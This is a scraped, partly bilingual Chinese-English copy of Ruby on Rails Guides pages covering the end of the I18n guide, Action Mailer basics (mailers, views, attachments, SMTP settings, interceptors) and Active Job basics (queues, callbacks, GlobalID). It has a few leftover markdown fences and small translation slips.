I18n support in Ruby on Rails was introduced in the release 2.2 and is still evolving. The project follows the good Ruby on Rails development tradition of evolving solutions in plugins and real applications first, and only then cherry-picking the best-of-breed of most widely useful features for inclusion in the core.                                                                                                                        Ruby on Rails的国际化支持还在发展进化之中，这里只是介绍了2.2版。这个项目跟从Ruby on Rails良好开发惯例，将进化的方案放在插件中，而真实的程序第一，并精心挑选，仅将应用广泛品种优良的特性包含在核心中。

Thus we encourage everybody to experiment with new ideas and features in plugins or other libraries and make them available to the community. (Don't forget to announce your work on our mailing list)                                                                                                                                            因此鼓励每个人都尝试插件或其他库中的新理念和特性，并对社区有用。（别忘了在我们的邮件列表中宣告你的工作）

If you find your own locale (language) missing from our example translations data repository for Ruby on Rails, please fork the repository, add your data and send a pull request.                             如果你在我们的Ruby on Rails例子翻译数据仓库中找不到自己的locale（语言），请分支这个仓库，添加你的数据，然后发送一个拉出请求。
##  9 Resources  参考资源

    rails-i18n.org - Homepage of the rails-i18n project. You can find lots of useful resources on the wiki.          rails-i18n项目的主页，你可以在它的wiki里找到很多有用的资源。
    Google group: rails-i18n - The project's mailing list.  项目的邮件列表
    GitHub: rails-i18n - Code repository for the rails-i18n project. Most importantly you can find lots of example translations for Rails that should work for your application in most cases.     项目的代码仓库。最重要的是你可以发现很多Rails的例子翻译，这些翻译在程序的大多数场景都能运行。
    GitHub: i18n - Code repository for the i18n gem.    i18n软件包的代码仓库。
    Lighthouse: rails-i18n - Issue tracker for the rails-i18n project.   rails-i18n项目的问题追踪器。
    Lighthouse: i18n - Issue tracker for the i18n gem.  i18n软件包的问题追踪器。

##  10 Authors  作者

    Sven Fuchs (initial author)
    Karel Minařík

If you found this guide useful, please consider recommending its authors on workingwithrails.         如果你觉得这个指南有用，请在 workingwithrails推荐指南的作者吧。
##  11 Footnotes  脚注

1 Or, to quote Wikipedia: "Internationalization is the process of designing a software application so that it can be adapted to various languages and regions without engineering changes. Localization is the process of adapting software for a specific region or language by adding locale-specific components and translating text."                                                                                                      或者引用维基百科的话：“国际化是指进行软件程序设计，以便软件程序可以无需改变工程就能适应不同语言和地区。本地化则是通过添加特定本地组件和翻译文本，让软件适用于特定地区和或语言。”

2 Other backends might allow or require to use other formats, e.g. a GetText backend might allow to read GetText files.                                                                                                                         其他后台可能允许或者要求使用其他格式，比如GetText后台可允许读取GetText文件。

3 One of these reasons is that we don't want to imply any unnecessary load for applications that do not need any I18n capabilities, so we need to keep the I18n library as simple as possible for English. Another reason is that it is virtually impossible to implement a one-fits-all solution for all problems related to I18n for all existing languages. So a solution that allows us to exchange the entire implementation easily is appropriate anyway. This also makes it much easier to experiment with custom features and extensions.                                                                                                   这些理由之一是，我们不想暗含其他对程序的国际化能力来说累赘的导入，所以我们要让国际化库保持尽可能的简单。其他理由是，不可能实现一个适合所有语言的解决方案，能解决所有与国际化有关的问题。所以允许我们简便地交换整个实现，是个恰当的解决方案。这也让尝试定制特性和扩展变得更加容易。

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Action Mailer 基础

本文全面介绍如何在程序中收发邮件，Action Mailer 的内部机理，以及如何测试“邮件程序”（mailer）。

读完本文，你将学到：

    如何在 Rails 程序内收发邮件；
    如何生成及编辑 Action Mailer 类和邮件视图；
    如何设置 Action Mailer；
    如何测试 Action Mailer 类；

Chapters

    简介
    发送邮件
        生成邮件程序的步骤
        自动编码邮件头
        Action Mailer 方法
        邮件程序的视图
        Action Mailer 布局
        在 Action Mailer 视图中生成 URL
        发送多种格式邮件
        发送邮件时动态设置发送选项
        不渲染模板
    接收邮件
    Action Mailer 回调
        设置 Action Mailer 使用 Gmail
    测试邮件程序
    拦截邮件

##  1 简介

Rails 使用 Action Mailer 实现发送邮件功能，邮件由邮件程序和视图控制。邮件程序继承自 ActionMailer::Base，作用和控制器类似，保存在文件夹 app/mailers 中，对应的视图保存在文件夹 app/views 中。
##  2 发送邮件

本节详细介绍如何创建邮件程序及对应的视图。
###  2.1 生成邮件程序的步骤
####  2.1.1 创建邮件程序
$ rails generate mailer UserMailer
create  app/mailers/user_mailer.rb
invoke  erb
create    app/views/user_mailer
invoke  test_unit
create    test/mailers/user_mailer_test.rb

如上所示，生成邮件程序的方法和使用其他生成器一样。邮件程序在某种程度上就是控制器。执行上述命令后，生成了一个邮件程序，一个视图文件夹和一个测试文件。

如果不想使用生成器，可以手动在 app/mailers 文件夹中新建文件，但要确保继承自 ActionMailer::Base：
class MyMailer < ActionMailer::Base
end
####  2.1.2 编辑邮件程序

邮件程序和控制器类似，也有称为“动作”的方法，以及组织内容的视图。控制器生成的内容，例如 HTML，发送给客户端；邮件程序生成的消息则通过电子邮件发送。

文件 app/mailers/user_mailer.rb 中有一个空的邮件程序：
class UserMailer < ActionMailer::Base
  default from: 'from@example.com'
end

下面我们定义一个名为 welcome_email 的方法，向用户的注册 Email 中发送一封邮件：
class UserMailer < ActionMailer::Base
  default from: 'notifications@example.com'
 
  def welcome_email(user)
    @user = user
    @url  = 'http://example.com/login'
    mail(to: @user.email, subject: 'Welcome to My Awesome Site')
  end
end

简单说明一下这段代码。可用选项的详细说明请参见“Action Mailer 方法”一节。

    default：一个 Hash，该邮件程序发出邮件的默认设置。上例中我们把 :from 邮件头设为一个值，这个类中的所有动作都会使用这个值，不过可在具体的动作中重设。
    mail：用于发送邮件的方法，我们传入了 :to 和 :subject 邮件头。

和控制器一样，动作中定义的实例变量可以在视图中使用。
####  2.1.3 创建邮件程序的视图

在文件夹 app/views/user_mailer/ 中新建文件 welcome_email.html.erb。这个视图是邮件的模板，使用 HTML 编写：
<!DOCTYPE html>
<html>
  <head>
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
  </head>
  <body>
    <h1>Welcome to example.com, <%= @user.name %></h1>
    <p>
      You have successfully signed up to example.com,
      your username is: <%= @user.login %>.<br>
    </p>
    <p>
      To login to the site, just follow this link: <%= @url %>.
    </p>
    <p>Thanks for joining and have a great day!</p>
  </body>
</html>

我们再创建一个纯文本视图。因为并不是所有客户端都可以显示 HTML 邮件，所以最好发送两种格式。在文件夹 app/views/user_mailer/ 中新建文件 welcome_email.text.erb，写入以下代码：
Welcome to example.com, <%= @user.name %>
===============================================
 
You have successfully signed up to example.com,
your username is: <%= @user.login %>.
 
To login to the site, just follow this link: <%= @url %>.
 
Thanks for joining and have a great day!

调用 mail 方法后，Action Mailer 会检测到这两个模板（纯文本和 HTML），自动生成一个类型为 multipart/alternative 的邮件。
####  2.1.4 调用邮件程序

其实，邮件程序就是渲染视图的另一种方式，只不过渲染的视图不通过 HTTP 协议发送，而是通过 Email 协议发送。因此，应该由控制器调用邮件程序，在成功注册用户后给用户发送一封邮件。过程相当简单。

首先，生成一个简单的 User 脚手架：
$ rails generate scaffold user name email login
$ rake db:migrate

这样就有一个可用的用户模型了。我们需要编辑的是文件 app/controllers/users_controller.rb，修改 create 动作，成功保存用户后调用 UserMailer.welcome_email 方法，向刚注册的用户发送邮件：
class UsersController < ApplicationController
  # POST /users
  # POST /users.json
  def create
    @user = User.new(params[:user])
 
    respond_to do |format|
      if @user.save
        # Tell the UserMailer to send a welcome email after save
        UserMailer.welcome_email(@user).deliver
 
        format.html { redirect_to(@user, notice: 'User was successfully created.') }
        format.json { render json: @user, status: :created, location: @user }
      else
        format.html { render action: 'new' }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
    end
  end
end

welcome_email 方法返回 Mail::Message 对象，在其上调用 deliver 方法发送邮件。
###  2.2 自动编码邮件头

Action Mailer 会自动编码邮件头和邮件主体中的多字节字符。

更复杂的需求，例如使用其他字符集和自编码文字，请参考 Mail 库的用法。
###  2.3 Action Mailer 方法

下面这三个方法是邮件程序中最重要的方法：

    headers：设置邮件头，可以指定一个由字段名和值组成的 Hash，或者使用 headers[:field_name] = 'value' 形式；
    attachments：添加邮件的附件，例如，attachments['file-name.jpg'] = File.read('file-name.jpg')；
    mail：发送邮件，传入的值为 Hash 形式的邮件头，mail 方法负责创建邮件内容，纯文本或多种格式，取决于定义了哪种邮件模板；

####  2.3.1 添加附件

在 Action Mailer 中添加附件十分方便。

    传入文件名和内容，Action Mailer 和 Mail gem 会自动猜测附件的 MIME 类型，设置编码并创建附件。

    attachments['filename.jpg'] = File.read('/path/to/filename.jpg')
    ```
 
    触发 `mail` 方法后，会发送一个由多部分组成的邮件，附件嵌套在类型为 `multipart/mixed` 的顶级结构中，其中第一部分的类型为 `multipart/alternative`，包含纯文本和 HTML 格式的邮件内容。
 
NOTE: Mail gem 会自动使用 Base64 编码附件。如果想使用其他编码方式，可以先编码好，再把编码后的附件通过 Hash 传给 `attachments` 方法。
 
*   传入文件名，指定邮件头和内容，Action Mailer 和 Mail gem 会使用传入的参数添加附件。
 
```ruby
    encoded_content = SpecialEncode(File.read('/path/to/filename.jpg'))
    attachments['filename.jpg'] = {mime_type: 'application/x-gzip',
                                   encoding: 'SpecialEncoding',
                                   content: encoded_content }
    ```
 
NOTE: 如果指定了 `encoding` 键，Mail 会认为附件已经编码了，不会再使用 Base64 编码附件。
 
#### 使用行间附件
 
在 Action Mailer 3.0 中使用行间附件比之前版本简单得多。
 
*   首先，在 `attachments` 方法上调用 `inline` 方法，告诉 Mail 这是个行间附件：
 
```ruby
    def welcome
      attachments.inline['image.jpg'] = File.read('/path/to/image.jpg')
    end
    ```
 
*   在视图中，可以直接使用 `attachments` 方法，将其视为一个 Hash，指定想要使用的附件，在其上调用 `url` 方法，再把结果传给 `image_tag` 方法：
 
```erb
    <p>Hello there, this is our image</p>
 
    <%= image_tag attachments['image.jpg'].url %>
    ```
 
*   因为我们只是简单的调用了 `image_tag` 方法，所以和其他图片一样，在附件地址之后，还可以传入选项 Hash：
 
```erb
    <p>Hello there, this is our image</p>
 
    <%= image_tag attachments['image.jpg'].url, alt: 'My Photo',
                                                class: 'photos' %>
    ```
 
#### 发给多个收件人
 
要想把一封邮件发送给多个收件人，例如通知所有管理员有新用户注册网站，可以把 `:to` 键的值设为一组邮件地址。这一组邮件地址可以是一个数组；也可以是一个字符串，使用逗号分隔各个地址。
 
```ruby
class AdminMailer < ActionMailer::Base
  default to: Proc.new { Admin.pluck(:email) },
          from: 'notification@example.com'
 
  def new_registration(user)
    @user = user
    mail(subject: "New User Signup: #{@user.email}")
  end
end

使用类似的方式还可添加抄送和密送，分别设置 :cc 和 :bcc 键即可。
####  2.3.2 在邮件中显示名字

有时希望收件人在邮件中看到自己的名字，而不只是邮件地址。实现这种需求的方法是把邮件地址写成 "Full Name <email>" 格式。
def welcome_email(user)
  @user = user
  email_with_name = "#{@user.name} <#{@user.email}>"
  mail(to: email_with_name, subject: 'Welcome to My Awesome Site')
end
###  2.4 邮件程序的视图

邮件程序的视图保存在文件夹 app/views/name_of_mailer_class 中。邮件程序之所以知道使用哪个视图，是因为视图文件名和邮件程序的方法名一致。如前例，welcome_email 方法的 HTML 格式视图是 app/views/user_mailer/welcome_email.html.erb，纯文本格式视图是 welcome_email.text.erb。

要想修改动作使用的视图，可以这么做：
class UserMailer < ActionMailer::Base
  default from: 'notifications@example.com'
 
  def welcome_email(user)
    @user = user
    @url  = 'http://example.com/login'
    mail(to: @user.email,
         subject: 'Welcome to My Awesome Site',
         template_path: 'notifications',
         template_name: 'another')
  end
end

此时，邮件程序会在文件夹 app/views/notifications 中寻找名为 another 的视图。template_path 的值可以是一个数组，按照顺序查找视图。

如果想获得更多灵活性，可以传入一个代码块，渲染指定的模板，或者不使用模板，渲染行间代码或纯文本：
class UserMailer < ActionMailer::Base
  default from: 'notifications@example.com'
 
  def welcome_email(user)
    @user = user
    @url  = 'http://example.com/login'
    mail(to: @user.email,
         subject: 'Welcome to My Awesome Site') do |format|
      format.html { render 'another_template' }
      format.text { render text: 'Render text' }
    end
  end
end

上述代码会使用 another_template.html.erb 渲染 HTML，使用 'Render text' 渲染纯文本。这里用到的 render 方法和控制器中的一样，所以选项也都是一样的，例如 :text、:inline 等。
###  2.5 Action Mailer 布局

和控制器一样，邮件程序也可以使用布局。布局的名字必须和邮件程序类一样，例如 user_mailer.html.erb 和 user_mailer.text.erb 会自动识别为邮件程序的布局。

如果想使用其他布局文件，可以在邮件程序中调用 layout 方法：
class UserMailer < ActionMailer::Base
  layout 'awesome' # use awesome.(html|text).erb as the layout
end

还是跟控制器布局一样，在邮件程序的布局中调用 yield 方法可以渲染视图。

在 format 代码块中可以把 layout: 'layout_name' 选项传给 render 方法，指定使用其他布局：
class UserMailer < ActionMailer::Base
  def welcome_email(user)
    mail(to: user.email) do |format|
      format.html { render layout: 'my_layout' }
      format.text
    end
  end
end

上述代码会使用文件 my_layout.html.erb 渲染 HTML 格式；如果文件 user_mailer.text.erb 存在，会用来渲染纯文本格式。
###  2.6 在 Action Mailer 视图中生成 URL

和控制器不同，邮件程序不知道请求的上下文，因此要自己提供 :host 参数。

一个程序的 :host 参数一般是相同的，可以在 config/application.rb 中做全局设置：
config.action_mailer.default_url_options = { host: 'example.com' }
####  2.6.1 使用 url_for 方法生成 URL

使用 url_for 方法时必须指定 only_path: false 选项，这样才能确保生成绝对 URL，因为默认情况下如果不指定 :host 选项，url_for 帮助方法生成的是相对 URL。
<%= url_for(controller: 'welcome',
            action: 'greeting',
            only_path: false) %>

如果没全局设置 :host 选项，使用 url_for 方法时一定要指定 only_path: false 选项。
<%= url_for(host: 'example.com',
            controller: 'welcome',
            action: 'greeting') %>

如果指定了 :host 选项，Rails 会生成绝对 URL，没必要再指定 only_path: false。
####  2.6.2 使用具名路由生成 URL

邮件客户端不能理解网页中的上下文，没有生成完整地址的基地址，所以使用具名路由帮助方法时一定要使用 _url 形式。

如果没有设置全局 :host 参数，一定要将其传给 URL 帮助方法。
<%= user_url(@user, host: 'example.com') %>
###  2.7 发送多种格式邮件

如果同一动作有多个模板，Action Mailer 会自动发送多种格式的邮件。例如前面的 UserMailer，如果在 app/views/user_mailer 文件夹中有 welcome_email.text.erb 和 welcome_email.html.erb 两个模板，Action Mailer 会自动发送 HTML 和纯文本格式的邮件。

格式的顺序由 ActionMailer::Base.default 方法的 :parts_order 参数决定。
###  2.8 发送邮件时动态设置发送选项

如果在发送邮件时想重设发送选项（例如，SMTP 密令），可以在邮件程序动作中使用 delivery_method_options 方法。
class UserMailer < ActionMailer::Base
  def welcome_email(user, company)
    @user = user
    @url  = user_url(@user)
    delivery_options = { user_name: company.smtp_user,
                         password: company.smtp_password,
                         address: company.smtp_host }
    mail(to: @user.email,
         subject: "Please see the Terms and Conditions attached",
         delivery_method_options: delivery_options)
  end
end
###  2.9 不渲染模板

有时可能不想使用布局，直接使用字符串渲染邮件内容，可以使用 :body 选项。但别忘了指定 :content_type 选项，否则 Rails 会使用默认值 text/plain。
class UserMailer < ActionMailer::Base
  def welcome_email(user, email_body)
    mail(to: user.email,
         body: email_body,
         content_type: "text/html",
         subject: "Already rendered!")
  end
end
##  3 接收邮件

使用 Action Mailer 接收和解析邮件做些额外设置。接收邮件之前，要先设置系统，把邮件转发给程序。所以，在 Rails 程序中接收邮件要完成以下步骤：

    在邮件程序中实现 receive 方法；

    设置邮件服务器，把邮件转发到 /path/to/app/bin/rails runner 'UserMailer.receive(STDIN.read)'；

在邮件程序中定义 receive 方法后，Action Mailer 会解析收到的邮件，生成邮件对象，解码邮件内容，实例化一个邮件程序，把邮件对象传给邮件程序的 receive 实例方法。下面举个例子：
class UserMailer < ActionMailer::Base
  def receive(email)
    page = Page.find_by(address: email.to.first)
    page.emails.create(
      subject: email.subject,
      body: email.body
    )
 
    if email.has_attachments?
      email.attachments.each do |attachment|
        page.attachments.create({
          file: attachment,
          description: email.subject
        })
      end
    end
  end
end
##  4 Action Mailer 回调

在 Action Mailer 中也可设置 before_action、after_action 和 around_action。

    和控制器中的回调一样，可以传入代码块，或者方法名的符号形式；

    在 before_action 中可以使用 defaults 和 delivery_method_options 方法，或者指定默认邮件头和附件；

    after_action 可以实现类似 before_action 的功能，而且在 after_action 中可以使用实例变量；

    class UserMailer < ActionMailer::Base
      after_action :set_delivery_options,
                   :prevent_delivery_to_guests,
                   :set_business_headers
 
      def feedback_message(business, user)
        @business = business
        @user = user
        mail
      end
 
      def campaign_message(business, user)
        @business = business
        @user = user
      end
 
      private
 
        def set_delivery_options
          # You have access to the mail instance,
          # @business and @user instance variables here
          if @business && @business.has_smtp_settings?
            mail.delivery_method.settings.merge!(@business.smtp_settings)
          end
        end
 
        def prevent_delivery_to_guests
          if @user && @user.guest?
            mail.perform_deliveries = false
          end
        end
 
        def set_business_headers
          if @business
            headers["X-SMTPAPI-CATEGORY"] = @business.code
          end
        end
    end
    ```
 
*   如果在回调中把邮件主体设为 `nil` 之外的值，会阻止执行后续操作；
 
使用 Action Mailer 帮助方法
--------------------------
 
Action Mailer 继承自 `AbstractController`，因此为控制器定义的帮助方法都可以在邮件程序中使用。
 
设置 Action Mailer
------------------
 
下述设置选项最好在环境相关的文件（`environment.rb`，`production.rb` 等）中设置。
 
| 设置项         | 说明        |
|---------------|-------------|
| `logger` | 运行邮件程序时生成日志信息。设为 `nil` 禁用日志。可设为 Ruby 自带的 `Logger` 或 `Log4r` 库。|
| `smtp_settings` | 设置 `:smtp` 发送方式的详情。 |
| `sendmail_settings` | 设置 `:sendmail` 发送方式的详情。 |
| `raise_delivery_errors` | 如果邮件发送失败，是否抛出异常。仅当外部邮件服务器设置为立即发送才有效。 |
| `delivery_method` | 设置发送方式，可设为 `:smtp`（默认）、`:sendmail`、`:file` 和 `:test`。详情参阅 [API 文档](http://api.rubyonrails.org/classes/ActionMailer/Base.html)。 |
| `perform_deliveries` | 调用 `deliver` 方法时是否真发送邮件。默认情况下会真的发送，但在功能测试中可以不发送。 |
| `deliveries` | 把通过 Action Mailer 使用 `:test` 方式发送的邮件保存到一个数组中，协助单元测试和功能测试。 |
| `default_options` | 为 `mail` 方法设置默认选项值（`:from`，`:reply_to` 等）。 |
 
完整的设置说明参见“设置 Rails 程序”一文中的“[设置 Action Mailer](configuring.html#configuring-action-mailer)”一节。
 
### Action Mailer 设置示例
 
可以把下面的代码添加到文件 `config/environments/$RAILS_ENV.rb` 中：
 
```ruby
config.action_mailer.delivery_method = :sendmail
# Defaults to:
# config.action_mailer.sendmail_settings = {
#   location: '/usr/sbin/sendmail',
#   arguments: '-i -t'
# }
config.action_mailer.perform_deliveries = true
config.action_mailer.raise_delivery_errors = true
config.action_mailer.default_options = {from: 'no-reply@example.com'}
###  4.1 设置 Action Mailer 使用 Gmail

Action Mailer 现在使用 Mail gem，针对 Gmail 的设置更简单，把下面的代码添加到文件 config/environments/$RAILS_ENV.rb 中即可：
config.action_mailer.delivery_method = :smtp
config.action_mailer.smtp_settings = {
  address:              'smtp.gmail.com',
  port:                 587,
  domain:               'example.com',
  user_name:            '<username>',
  password:             '<password>',
  authentication:       'plain',
  enable_starttls_auto: true  }
##  5 测试邮件程序

邮件程序的测试参阅“Rails 程序测试指南”。
##  6 拦截邮件

有时，在邮件发送之前需要做些修改。Action Mailer 提供了相应的钩子，可以拦截每封邮件。你可以注册一个拦截器，在交给发送程序之前修改邮件。
class SandboxEmailInterceptor
  def self.delivering_email(message)
    message.to = ['sandbox@example.com']
  end
end

使用拦截器之前要在 Action Mailer 框架中注册，方法是在初始化脚本 config/initializers/sandbox_email_interceptor.rb 中添加以下代码：
ActionMailer::Base.register_interceptor(SandboxEmailInterceptor) if Rails.env.staging?

上述代码中使用的是自定义环境，名为“staging”。这个环境和生产环境一样，但只做测试之用。关于自定义环境的详细介绍，参阅“新建 Rails 环境”一节。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Job Basics  活性作业基础

This guide provides you with all you need to get started in creating, enqueueing and executing background jobs.    这份指南提供了所有开始创建、排列和执行背景作业的所有知识。

After reading this guide, you will know:     读完这份指南之后，你将知道：

    How to create jobs.   怎么创建作业；
    How to enqueue jobs.  怎么排列作业；
    How to run jobs in the background.  怎么在背景中运行作业；
    How to send emails from your application async.  怎么从程序同步发送邮件

Chapters 章节

    Introduction  介绍
    The Purpose of Active Job  活性作业的目的
    Creating a Job 创建一个作业
        Create the Job 创建作业
        Enqueue the Job 排列作业
    Job Execution 作业执行
        Backends 后台
        Setting the Backend  设置后台
    Queues 队列
    Callbacks 回调
        Available callbacks 可用回调
        Usage 用法
    Action Mailer 动作邮箱
    GlobalID 全局ID
    Exceptions 异常

##  1 Introduction 介绍

Active Job is a framework for declaring jobs and making them run on a variety of queueing backends. These jobs can be everything from regularly scheduled clean-ups, to billing charges, to mailings. Anything that can be chopped up into small units of work and run in parallel, really.         活性记录是一个框架，用来声明作业，并使它运行在多种队列后台之上。这些作业可以是任何东西，包括普通的纲要清除，到账单支付，到收发邮件。任何可被分解成小单元且并行运行的工作，都是。
##  2 The Purpose of Active Job  活性作业的目的

The main point is to ensure that all Rails apps will have a job infrastructure in place, even if it's in the form of an "immediate runner". We can then have framework features and other gems build on top of that, without having to worry about API differences between various job runners such as Delayed Job and Resque. Picking your queuing backend becomes more of an operational concern, then. And you'll be able to switch between them without having to rewrite your jobs.                         主要的一点是确保所有的Rails程序有一个作业框架，即使是以“立即运行”的形式。有了它，就有了框架的特性，其他软件包就可以构建于其上，无需担心各种作业运行器API上的差异，比如Delayed Job和Resque。而选择队列后台会更和操作性相关。你可以在它们之间进行转换，无需重新这些作业。
##  3 Creating a Job  创建一个作业

This section will provide a step-by-step guide to creating a job and enqueuing it.                                这一节将提供一个手把手的指南，来创建一个作业，并进行排列。
###  3.1 Create the Job  创建作业

Active Job provides a Rails generator to create jobs. The following will create a job in app/jobs (with an attached test case under test/jobs):                                                                                 活性作业提供了一个Rails生成器来创建作业。下面将做程序或作业里生成一个作业（还有一个在test/jobs附带的测试）。
$ bin/rails generate job guests_cleanup
invoke  test_unit
create    test/jobs/guests_cleanup_job_test.rb
create  app/jobs/guests_cleanup_job.rb

You can also create a job that will run on a specific queue:                                                               你也可以创建一个作业，运行一个特定的队列：
$ bin/rails generate job guests_cleanup --queue urgent

If you don't want to use a generator, you could create your own file inside of app/jobs, just make sure that it inherits from ActiveJob::Base.                                                                                        如果你不想使用生成器，可以在app/jobs里创建自己的文件，只需确保它继承了ActiveJob::Base。

Here's what a job looks like:          这是作业的样子：
class GuestsCleanupJob < ActiveJob::Base
  queue_as :default
 
  def perform(*args)
    # Do something later 其他代码
  end
end
###  3.2 Enqueue the Job  排列作业

Enqueue a job like so:          像这样排列一个作业：
# Enqueue a job to be performed as soon the queueing system is free.
# 排列一个作业，让它在队列系统空闲的时候运行起来
MyJob.perform_later record
# Enqueue a job to be performed tomorrow at noon.
# 排列一个作业，让它在明天中午运行起来
MyJob.set(wait_until: Date.tomorrow.noon).perform_later(record)
# Enqueue a job to be performed 1 week from now.
# 排列一个作业，让它从现在起一周后运行起来。
MyJob.set(wait: 1.week).perform_later(record)

That's it!   就是这样！
##  4 Job Execution   作业执行

If no adapter is set, the job is immediately executed.                                                                        如果没有设定适配器，作业将立刻执行。
###  4.1 Backends  后台

Active Job has built-in adapters for multiple queueing backends (Sidekiq, Resque, Delayed Job and others). To get an up-to-date list of the adapters see the API Documentation for ActiveJob::QueueAdapters.                                                                                                               活性作业为多个队列后台（Sidekiq, Resque, Delayed Job和其他后台）提供了内建的适配器。最新列表将ActiveJob::QueueAdapters的API文档。
###  4.2 Setting the Backend  设置后台

You can easily set your queueing backend:      设置队列后台十分简单：
# config/application.rb
module YourApp
  class Application < Rails::Application
    # Be sure to have the adapter's gem in your Gemfile and follow
    # the adapter's specific installation and deployment instructions.
    config.active_job.queue_adapter = :sidekiq
  end
end
##  5 Queues  队列

Most of the adapters support multiple queues. With Active Job you can schedule the job to run on a specific queue:                                                                                                                                   大多数适配器支持多个队列。使用活性作业，可以将作业安排在特定队列中运行。
class GuestsCleanupJob < ActiveJob::Base
  queue_as :low_priority
  #....
end

You can prefix the queue name for all your jobs using config.active_job.queue_name_prefix in application.rb:                                                                                                                           可以在application.rb文件中使用config.active_job.queue_name_prefix为所有作业加上队列名前缀。
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.active_job.queue_name_prefix = Rails.env
  end
end
 
# app/jobs/guests_cleanup.rb
class GuestsCleanupJob < ActiveJob::Base
  queue_as :low_priority
  #....
end
 
# Now your job will run on queue production_low_priority on your
# production environment and on staging_low_priority on your staging
# environment
# 现在，你的作业在生产环境时将运行在production_low_priority队列上。
# 分段环境时则运行在staging_low_priority队列上。

The default queue name prefix delimiter is '_'. This can be changed by setting config.active_job.queue_name_delimiter in application.rb:                                             默认的队列名称前置符是'_'。通过设置 application.rb的config.active_job.queue_name_delimiter可以改变。
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.active_job.queue_name_prefix = Rails.env
    config.active_job.queue_name_delimiter = '.'
  end
end
 
# app/jobs/guests_cleanup.rb
class GuestsCleanupJob < ActiveJob::Base
  queue_as :low_priority
  #....
end
 
# Now your job will run on queue production.low_priority on your
# production environment and on staging.low_priority on your staging
# environment
# 现在，你的作业在生产环境时将运行在production_low_priority队列上。
# 分段环境时则运行在staging_low_priority队列上。

If you want more control on what queue a job will be run you can pass a :queue option to #set:     如果想掌控更多关于作业在哪个队列上的事情，可以给作业传入:queue选项到#set上。
MyJob.set(queue: :another_queue).perform_later(record)

To control the queue from the job level you can pass a block to #queue_as. The block will be executed in the job context (so you can access self.arguments) and you must return the queue name:                                                                                                                                                  为了控制队列的作业级别，可以传入一个块到#queue_as方法上。该块将在作业的环境中被执行（所以可以访问self.arguments），但必须返回队列的名称。
class ProcessVideoJob < ActiveJob::Base
  queue_as do
    video = self.arguments.first
    if video.owner.premium?
      :premium_videojobs
    else
      :videojobs
    end
  end
 
  def perform(video)
    # do process video
  end
end
 
ProcessVideoJob.perform_later(Video.last)

Make sure your queueing backend "listens" on your queue name. For some backends you need to specify the queues to listen to. 确保你的队列后台监听这你的队列名称。对于一些后台来说，你需要指定它要监听的队列。
##  6 Callbacks  回调

Active Job provides hooks during the lifecycle of a job. Callbacks allow you to trigger logic during the lifecycle of a job.                                                                                                                            活性作业在作业的生命周期内提供了一些钩子。回调允许你在作业的生命周期内触发逻辑。
###  6.1 Available callbacks   可用的回调

    before_enqueue
    around_enqueue
    after_enqueue
    before_perform
    around_perform
    after_perform

###  6.2 Usage 用法
class GuestsCleanupJob < ActiveJob::Base
  queue_as :default
 
  before_enqueue do |job|
    # do something with the job instance 用job实例做些什么
  end
 
  around_perform do |job, block|
    # do something before perform 执行之前
    block.call
    # do something after perform 执行之后
  end
 
  def perform
    # Do something later 运行之后
  end
end
##  7 Action Mailer  动作邮箱

One of the most common jobs in a modern web application is sending emails outside of the request-response cycle, so the user doesn't have to wait on it. Active Job is integrated with Action Mailer so you can easily send emails asynchronously:                                                                      现代web应用程序里最常用的一个作业是在请求-响应周期之外发送电邮，用户不需要等待。活性作业集成在动作邮箱里，因此可以很容易做到同步发送邮件。
# If you want to send the email now use #deliver_now
# 如果想使用#deliver_now马上发送邮件。
UserMailer.welcome(@user).deliver_now
 
# If you want to send the email through Active Job use #deliver_later
# 如果想通过活性作业使用#deliver_later发送邮件。
UserMailer.welcome(@user).deliver_later
##  8 GlobalID  全局ID

Active Job supports GlobalID for parameters. This makes it possible to pass live Active Record objects to your job instead of class/id pairs, which you then have to manually deserialize. Before, jobs would look like this:                                                                                                                      活性作业支持参数的全局ID。这允许传递活动的活性记录对象（不是类/id对）到作业中；如果使用类和id对，则必须手动去序列化。之前的作业可能像这样：
class TrashableCleanupJob < ActiveJob::Base
  def perform(trashable_class, trashable_id, depth)
    trashable = trashable_class.constantize.find(trashable_id)
    trashable.cleanup(depth)
  end
end

Now you can simply do:   现在则只需要这样：
class TrashableCleanupJob < ActiveJob::Base
  def perform(trashable, depth)
    trashable.cleanup(depth)
  end
end

This works with any class that mixes in GlobalID::Identification, which by default has been mixed into Active Model classes.   任何混入了GlobalID::Identification的类都可以做到，而默认情况下活性模块类就混入了。
##  9 Exceptions  异常

Active Job provides a way to catch exceptions raised during the execution of the job:                       活性作业提供了一个方式来捕捉作业执行期间的异常。
class GuestsCleanupJob < ActiveJob::Base
  queue_as :default
 
  rescue_from(ActiveRecord::RecordNotFound) do |exception|
   # do something with the exception 异常出现后做的事情
  end
 
  def perform
    # Do something later 稍后要做的事情
  end
end

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

